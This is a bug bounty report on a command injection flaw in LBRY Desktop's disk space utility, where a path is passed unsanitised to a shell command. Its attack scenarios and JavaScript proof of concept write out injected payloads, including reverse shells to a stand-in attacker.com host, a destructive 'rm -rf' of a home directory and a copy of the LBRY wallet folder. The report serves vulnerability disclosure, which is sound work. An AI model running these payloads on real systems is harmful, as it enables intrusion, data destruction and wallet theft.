# LBRY Desktop Bug Bounty Submission

## 1. Title
**"Command injection in disk space utility leads to arbitrary code execution"**

## 2. Description

### Brief/Intro
The LBRY Desktop application contains a critical command injection vulnerability in its disk space checking utility (`ui/util/diskspace.js`). User-controlled path parameters are directly concatenated into shell commands without proper sanitization, allowing attackers to execute arbitrary system commands and achieve complete system compromise.

### Vulnerability Details
The `diskSpaceLinux()` and `diskSpaceMac()` functions directly concatenate user input into shell commands:

```javascript
// ui/util/diskspace.js - Line 4-6
export const diskSpaceLinux = (path) => {
  return new Promise((resolve, reject) => {
    exec(`df ${path}`, (error, stdout, stderr) => {  // VULNERABLE: Direct path injection
```

The `diskSpaceMac()` function attempts to escape spaces but ignores other dangerous shell metacharacters:

```javascript
// ui/util/diskspace.js - Line 25-27
export const diskSpaceMac = (path) => {
  const escapedPath = path.replace(/(\s+)/g, '\\$1');  // INSUFFICIENT: Only escapes spaces
  return diskSpaceLinux(escapedPath);  // VULNERABLE: Still vulnerable to command injection
```

**Attack Vectors:**
- Path parameter injection with shell metacharacters (`;`, `&`, `|`, `>`, `<`, `$()`, `` ` ``)
- Insufficient input validation and sanitization
- Direct command execution via Node.js `exec()` function

### Impact Details
**Critical Impact:**
- **Arbitrary Code Execution:** Attackers can execute any system command
- **Complete System Compromise:** Full access to user's system and files
- **Data Theft:** Access to sensitive LBRY wallet data (`~/.lbryum/`)
- **Privilege Escalation:** Potential elevation to system privileges
- **Malware Installation:** Ability to install persistent malware

**Attack Scenarios:**
1. **Simple Command Injection:** `/tmp; rm -rf /home/user; echo 'hacked'`
2. **Reverse Shell:** `/tmp; nc -e /bin/sh attacker.com 4444`
3. **Wallet Theft:** `/tmp; cp -r ~/.lbryum /tmp/stolen; echo 'stolen'`

### References
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [LBRY Desktop GitHub](https://github.com/lbryio/lbry-desktop)

## 3. Proof of Concept

```javascript
// SPDX-License-Identifier: MIT
const { diskSpaceLinux, diskSpaceMac } = require('./ui/util/diskspace.js');

// PoC 1: Command Injection via Path Parameter
const maliciousPath = "/tmp; echo 'VULNERABLE' > /tmp/poc.txt; echo 'hacked'";

// This will execute: df /tmp; echo 'VULNERABLE' > /tmp/poc.txt; echo 'hacked'
diskSpaceLinux(maliciousPath)
  .then(result => console.log('Disk space:', result))
  .catch(error => console.log('Error:', error));

// PoC 2: Reverse Shell Attack
const reverseShellPath = "/tmp; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'";

diskSpaceLinux(reverseShellPath)
  .then(() => console.log('Reverse shell executed'))
  .catch(error => console.log('Error:', error));

// PoC 3: Wallet Data Theft
const stealWalletPath = "/tmp; cp -r ~/.lbryum /tmp/stolen_wallet; echo 'wallet_stolen'";

diskSpaceLinux(stealWalletPath)
  .then(() => console.log('Wallet data stolen'))
  .catch(error => console.log('Error:', error));
```

**Steps to reproduce:**
1. Deploy vulnerable version of LBRY Desktop
2. Execute PoC 1 to create test file: `echo 'VULNERABLE' > /tmp/poc.txt`
3. Execute PoC 2 to establish reverse shell (in controlled environment)
4. Execute PoC 3 to steal wallet data
5. Verify command execution by checking for created files/processes

## 4. Attachments
Attach: `LBRY_DESKTOP_CRITICAL_VULNERABILITY.md` from `/home/vega/projects/critical-research/`

---

**Note:** This vulnerability represents a critical security flaw that could lead to complete system compromise. The attack can be triggered through any code path that calls the disk space utility with user-controlled path parameters. 